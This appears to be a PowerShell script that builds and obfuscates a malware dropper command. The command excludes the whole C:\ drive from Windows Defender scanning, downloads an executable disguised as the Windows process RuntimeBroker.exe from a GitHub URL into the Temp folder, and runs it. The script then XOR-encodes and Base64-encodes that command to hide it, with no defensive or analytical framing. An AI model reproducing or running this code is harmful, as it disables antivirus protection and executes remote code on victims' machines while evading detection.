# Original command
$command = @"
Add-MpPreference -ExclusionPath C:\; $url='https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.exe'; $output="$env:Temp\RuntimeBroker.exe"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output
"@

Write-Host "Original Command:" -ForegroundColor Yellow
Write-Host $command

# XOR each character with 101
$xorKey = 101
$xorBytes = $command.ToCharArray() | ForEach-Object {
    $xorChar = [byte]($_ -bxor $xorKey)
    $xorChar
}

# Base64 encode the XOR'd result
$base64Encoded = [Convert]::ToBase64String($xorBytes)

Write-Host "`nBase64 Encoded XOR'd Command:" -ForegroundColor Cyan
Write-Host $base64Encoded

# Decode from Base64
$decodedBytes = [Convert]::FromBase64String($base64Encoded)

# Reverse XOR to get original characters
$decodedCommand = -join ($decodedBytes | ForEach-Object { [char]($_ -bxor $xorKey) })

Write-Host "`nDecoded Command:" -ForegroundColor Yellow
Write-Host $decodedCommand
